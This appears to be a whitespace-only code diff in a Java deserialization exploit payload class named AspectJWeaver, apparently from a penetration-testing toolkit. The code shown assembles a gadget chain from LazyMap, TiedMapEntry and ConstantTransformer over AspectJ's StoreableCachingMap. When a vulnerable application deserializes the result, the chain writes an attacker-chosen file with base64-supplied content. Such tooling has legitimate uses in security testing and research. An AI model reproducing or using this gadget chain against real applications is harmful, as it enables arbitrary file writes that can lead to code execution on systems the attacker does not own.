@@ -49,16 +49,16 @@ public class AspectJWeaver implements ObjectPayload<Serializable> {
         if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <filename>:<base64 Object>");
         }
-        String[] parts    = command.split(":");
-        String   filename = parts[0];
-        byte[]   content  = Base64.decodeBase64(parts[1]);
+        String[] parts = command.split(":");
+        String filename = parts[0];
+        byte[] content = Base64.decodeBase64(parts[1]);
 
-        Constructor<?> ctor        = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
-        Object         simpleCache = ctor.newInstance(".", 12);
-        Transformer    ct          = new ConstantTransformer(content);
-        Map            lazyMap     = LazyMap.decorate((Map) simpleCache, ct);
-        TiedMapEntry   entry       = new TiedMapEntry(lazyMap, filename);
-        HashSet        map         = new HashSet(1);
+        Constructor<?> ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
+        Object simpleCache = ctor.newInstance(".", 12);
+        Transformer ct = new ConstantTransformer(content);
+        Map lazyMap = LazyMap.decorate((Map) simpleCache, ct);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
+        HashSet map = new HashSet(1);
         map.add("QI4L");
         Field f;
         try {
